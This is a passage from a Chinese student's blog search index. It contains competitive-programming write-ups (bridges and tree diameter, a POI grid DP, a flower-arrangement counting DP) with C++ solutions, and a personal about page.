while(scanf(&quot;%d%d&quot;,&amp;n,&amp;m)==2)    {        if(n==0&amp;&amp;m==0)break;        memset(head,0,sizeof head);memset(dfn,0,sizeof dfn);        memset(low,0,sizeof low);memset(pa,0,sizeof pa);        memset(headd,0,sizeof headd);        num=0;cnt=0;bi=0;w=0;input=0;numm=0;ans=0;ww=0;        for(int i=1;i&lt;=m;i++)        {scanf(&quot;%d%d&quot;,&amp;a,&amp;b);add(a,b);}        tar(1);        for(int i=1;i&lt;=num;i++)        {            a=fa[q[i].from];b=fa[q[i].to];            if(a!=b)addd(a,b);        }        mdep=0;dfs(1,0,0);        mdep=0;dfs(ww,0,0);        printf(&quot;%d\n&quot;,ans-mdep);    }    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbLTE1OTc1ODc0MDddfQ==-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 桥 </tag>
            
            <tag> 边双联通分量 </tag>
            
            <tag> 树的直径 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>POI working up</title>
      <link href="/2018/10/23/%5BPOI%5Dworking%20up/"/>
      <url>/2018/10/23/%5BPOI%5Dworking%20up/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>有两个人和一个$n \times m$的矩阵,一个从左上角出发,只能向右,向下走,去右下角;另一个从右上角出发只能向左,向下走,去左下角.矩阵的每一格有一个权值,走过会得到这个权值.很显然,两个人肯定会相遇,他们相遇的那一格的权值不取,求两人只相遇一次权值和的最大值</p></blockquote><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><blockquote><p><strong>读完题,你是否有想到<code>方格取数</code><br>做法非常简单也非常暴力,开四个二维数组分别记录从四个角出发的最优解,然后$n^2$枚举合法的点,更新$ans$<br>因为只相遇一次,所以两人相遇时只有两种直线走法,不会转弯</strong></p><ul><li>注意下标,容易迷糊</li><li>记得开<code>long long</code><h3 id="Coding"><a href="#Coding" class="headerlink" title="Coding:"></a>Coding:</h3><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#define ll long longusing namespace std;const int maxn=1010;ll mp[maxn][maxn],f1[maxn][maxn];ll f2[maxn][maxn],f3[maxn][maxn];ll f4[maxn][maxn];int n,m;int main(){  scanf(&quot;%d%d&quot;,&amp;n,&amp;m);  for(int i=1;i&lt;=n;i++)for(int j=1;j&lt;=m;j++)scanf(&quot;%lld&quot;,&amp;mp[i][j]);  for(int i=1;i&lt;=n;i++)for(int j=1;j&lt;=m;j++)  f1[i][j]=max(f1[i-1][j],f1[i][j-1])+mp[i][j];  for(int i=n;i;i--)for(int j=m;j;j--)  f2[i][j]=max(f2[i+1][j],f2[i][j+1])+mp[i][j];  for(int i=1;i&lt;=n;i++)for(int j=m;j;j--)  f3[i][j]=max(f3[i-1][j],f3[i][j+1])+mp[i][j];  for(int i=n;i;i--)for(int j=1;j&lt;=m;j++)  f4[i][j]=max(f4[i+1][j],f4[i][j-1])+mp[i][j];  //暴力美学  ll ans=0;  for(int i=2;i&lt;n;i++)for(int j=2;j&lt;m;j++)  {      ans=max(ans,f1[i][j-1]+f2[i][j+1]+f3[i-1][j]+f4[i+1][j]);      ans=max(ans,f1[i-1][j]+f2[i+1][j]+f3[i][j+1]+f4[i][j-1]);  }  printf(&quot;%lld\n&quot;,ans);  return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbMjAxNTEzOTAxMiwtMjExMjg0OTMyMCw4MzExMjc2MzhdfQ==--></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>摆花</title>
      <link href="/2018/10/23/%E6%91%86%E8%8A%B1/"/>
      <url>/2018/10/23/%E6%91%86%E8%8A%B1/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>有$n$种花,每种有$a_i$盆,要摆$m$盆,每种花连续并且编号大的在后.求有多少种摆法</p></blockquote><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><blockquote><p><strong>一道简单的计数DP.<br>我们定义$f[i][j]$表示放第$i$种花时一共放了$j$盆时的方案数,那么状态转移方程:</strong><script type="math/tex">f[i][j]=\sum_{k=0}^{a[i]} f[i-1][j-k]</script></p></blockquote><ul><li>$f[0][0]=1$</li><li>$j&gt;=k$</li></ul><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=110,mod=1e6+7;int n,m,f[maxn][maxn],a[maxn];int main(){    scanf(&quot;%d%d&quot;,&amp;n,&amp;m);f[0][0]=1;    for(int i=1;i&lt;=n;i++)scanf(&quot;%d&quot;,&amp;a[i]);    for(int i=1;i&lt;=n;i++)    for(int j=0;j&lt;=m;j++)    for(int k=0;k&lt;=a[i];k++)if(j&gt;=k)    f[i][j]=(f[i][j]+f[i-1][j-k])%mod;    printf(&quot;%d\n&quot;,f[n][m]);    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbLTI1NjgwMDk5OF19-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计数DP </tag>
            
        </tags>
      
    </entry>
    
  
  
    
    <entry>
      <title>links</title>
      <link href="/links/index.html"/>
      <url>/links/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<h1 id="居然有人点开了这个页面-ΩДΩ"><a href="#居然有人点开了这个页面-ΩДΩ" class="headerlink" title="居然有人点开了这个页面 (ΩДΩ)"></a>居然有人点开了这个页面 (ΩДΩ)</h1><p>可能是你点错了,毕竟我这么菜,<br>谁会来看我呢<del>(滑稽)</del></p><p><img src="https://s1.ax1x.com/2018/10/24/ir5US0.png" alt=""></p><p>本人一名<strong>小蒟蒻</strong>,在各位大佬间苦苦挣扎,苟且偷生<del>(宝宝心里苦,难受,香菇)</del></p><p>不喜欢打游戏(偶尔玩玩),喜欢搞一些计算机上奇奇怪怪的东西(对,就是老师和爸妈口中的”不务正业”,”没名堂的东西”,”浪费时间”)</p><p>喜欢二次元,喜欢宅在家里的穷学生</p><p><img src="https://s1.ax1x.com/2018/10/24/ir5ITH.gif" alt="ir5ITH.gif"></p><p>学过一点点C++,Java之类的,算法也有一点涉猎(请记住,是一点点,就像你对于地球那样的一点点),当然没有办法和各位大佬比</p><p>对了,最近觉得CTF挺有意思的,又了解了一下CTF,认识了一些很有趣的人</p><p><img src="https://s1.ax1x.com/2018/10/24/ir5Dw4.gif" alt="ir5Dw4.gif"></p><p>曾经是一位OIer,但是退役了,好吧,像我这种弱鸡,根本不能说退役,是根本没入役</p><p>退役的我毅然决然地投入了CTFer的怀抱</p><p>要问我为什么,我只能说缘分</p><p>听起来很悬,但事实就这样,谁叫生活总是起起落落落落落落落落……</p><p><img src="https://s1.ax1x.com/2018/10/24/ir5yk9.jpg" alt="ir5yk9.jpg"></p><p>好吧,了解了我的菜之深后,你肯定也不想继续看下去了,但我还是厚颜无耻的写下我的联系方式</p><p>QQ: </p><blockquote><p>1836017424</p></blockquote><p>Email: </p><blockquote><p>1836017424@qq.com </p><p>scaryffy@gmail.com</p></blockquote><p>你如果有问题,可以通过上面的方式联系我(可能这辈子都不会有了)</p><p>在下学生,不能保证及时回复,但我看到了一定会回复</p><p><img src="https://s1.ax1x.com/2018/10/24/ir550e.jpg" alt="ir550e.jpg"></p><h3 id="愿幸运与你同在"><a href="#愿幸运与你同在" class="headerlink" title="愿幸运与你同在"></a>愿幸运与你同在</h3><p>但如果你有上条当麻的右手,我还真没办法</p><p>至此</p>]]></content>
      
    </entry>
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
  
</search>
